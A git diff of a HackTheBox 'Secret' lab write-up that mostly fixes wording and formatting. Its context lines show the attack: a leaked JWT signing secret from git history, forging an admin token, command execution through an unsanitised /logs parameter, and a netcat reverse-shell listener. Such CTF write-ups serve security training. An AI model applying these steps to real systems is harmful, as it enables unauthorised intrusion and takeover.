@@ -20,11 +20,11 @@ tags:
 
 ![secret](/assets/images/2021-11-19-14-47-29.png)
 
-Secret is rated as an easy machine on HackTheBox. We start with a backup found on the website running on the box. In there we find a number of interesting files, which leads us to interacting with an API. Eventually we create a Java Web Token and can perform remote code execution, which we use to get a reverse shell. Escalation to root involves further code review, this time of a c program found on the box. From that we find crashing the program allows us to see the contents of memory via a coredump. And in there we can retrieve the root flag.
+Secret is rated as an easy machine on HackTheBox. We start with a backup found on the website running on the box. In there we find a number of interesting files, which leads us to interacting with an API. Eventually we create a JSON Web Token and can perform remote code execution, which we use to get a reverse shell. Escalation to root involves further code review, this time of a c program found on the box. From that we find crashing the program allows us to see the contents of memory via a core-dump. And in there we can retrieve the root flag.
 
 <!--more-->
 
-Skills required are a basic understanding of Java code. Skills learned are manipulating Java Web Tokens and inspecting coredumps for sensitive information.
+Skills required are a basic understanding of Java code. Skills learned are manipulating JSON Web Tokens and inspecting core-dumps for sensitive information.
 
 | Details |  |
 | --- | --- |
@@ -38,7 +38,7 @@ Skills required are a basic understanding of Java code. Skills learned are manip
 
 As always let's start with Nmap:
 
-```text
+```sh
 ┌──(root💀kali)-[~/htb/secret]
 └─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.120 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
 
@@ -128,7 +128,7 @@ Archive:  files.zip
  4 -rw-rw-r--   1 root root   651 Aug 13 05:42 validations.js
 ```
 
-In the local-web folder we see a lot of files. FIrst one I looked at is .env:
+In the local-web folder we see a lot of files. First one I looked at is .env:
 
 ```sh
 ┌──(root💀kali)-[~/htb/secret/local-web]
@@ -362,7 +362,7 @@ router.get('/priv', verifytoken, (req, res) => {
 
 This gives us another endpoint to try called /priv. Interestingly it shows us if we have the username theadmin and provide a valid token we have the admin role, otherwise we're a normal user.
 
-Later in the same file we see there's an endpoint called /logs that will allow us to pass a parameter called file that isn't sanitised if we are theadmin user.
+Later in the same file we see there's an endpoint called /logs that will allow us to pass a parameter called file that isn't sanitised if we are theadmin user:
 
 ```java
 router.get('/logs', verifytoken, (req, res) => {
@@ -536,9 +536,9 @@ We have six commits in the git repo. I searched for TOKEN_SECRET which we found 
 5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/.env:2:TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
 ```
 
-We can use this secret and our existing user JWT we created earlier with jwt_tool to create ourselves a tampered token that works as theadmin:
-
 ## Create theadmin JWT
+
+We can use this secret and our existing user JWT we created earlier with jwt_tool to create ourselves a tampered token that works as theadmin:
 
 ```sh
 ┌──(root💀kali)-[~/htb/secret]
@@ -561,7 +561,7 @@ jwttool_a9ca90340bdb619642f0fbd1df1e6f4e - Tampered token - HMAC Signing:
 
 ## Remote Code Execution
 
-With this new token we can use the /logs api we found earlier and authenticate as theadmin. This let's us use that unsanitised parameter we saw in the source code. Let's try and get the passwd file
+With this new token we can use the /logs api we found earlier and authenticate as theadmin. This let's us use that unsanitised parameter we saw in the source code. Let's try and get the passwd file:
 
 ```sh
 ┌──(root💀kali)-[~/htb/secret]
@@ -635,7 +635,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 And then we see our shell is connected:
 
 ```sh
-──(root💀kali)-[~/htb/secret]
+┌──(root💀kali)-[~/htb/secret]
 └─# nc -lvvp 1337
 listening on [any] 1337 ...
 connect to [10.10.15.15] from secret.htb [10.10.11.120] 51496
